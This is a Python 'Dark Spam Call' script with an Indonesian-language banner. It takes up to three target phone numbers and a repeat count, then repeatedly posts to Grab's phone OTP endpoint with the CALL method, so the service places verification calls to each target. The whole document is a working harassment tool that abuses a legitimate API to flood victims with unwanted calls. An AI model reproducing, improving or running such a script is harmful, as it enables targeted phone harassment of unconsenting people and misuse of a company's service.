#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by Rendy Andhika
"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""

try:
	import os, requests, time
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
	         
█████████        Pencipta: Yoga Wira 
█▄█████▄█      ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
█▼▼▼▼▼\033[1;94m- _ --_--                                        
\033[1;96m█                     
\033[1;96m█   \033[1;94m-_-_- -_ -_-_-  \033[1;93mDark Spam Call%s
\033[1;96m█  
\033[1;96m█▲▲▲▲▲ \033[1;94m-_  - _  
\033[1;96m█████████      «°°°°°°°°°°✧°°°°°°°°°°»
\033[1;96m ██ ██ 
 	
\033[1;95m¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤ ¤°¤°¤°¤°¤°¤°¤
%s\033[1;93mAuthor: Mr.BV%s 
%s\033[1;93mFB: Yoga Wira%s 
%s\033[1;93mGithub: Rahasia Jancok%s 
%s\033[1;93mTEAM: Brother (B.VH/Brother_ID)%s
\033[1;95m¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤ ¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤                                        
%sMASUKAN NOMOR ANDA "62" (EX: 628XXXXXX)%s

¤NOTE¤ Jika Terjadi Eror Atau Bug Silahkan Cht Author"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Klik ENTER Untuk Melewati Step%s"%(g,g))
no1 = input("[?] NOMOR TARGET 1 => %s"%(w))
no2 = input("%s[?] NOMOR TARGET 2 => %s"%(g,w))
no3 = input("%s[?] NOMOR TARGET 3 => %s"%(g,w))
jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(g,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}

try:
	print()
	print("%s[-] RESULT:%s"%(r,w))
	for i in range(jlmh):
		print("[!] PLEASE WAIT...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
		if str(idk) in str(r1.text):
			print("[+] TARGET1 BERHASIL")
		else:
			print("[-] TARGET1 GAGAL")
		if str(idk) in str(r2.text):
			print("[+] TARGET2 BERHASIL")
		else:
			print("[-] TARGET2 GAGAL")
		if str(idk) in str(r3.text):
			print("[+] TARGET3 BERHASIL")
		else:
			print("[-] TARGET3 GAGAL")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%ssampai jumpa gan..."%(c))
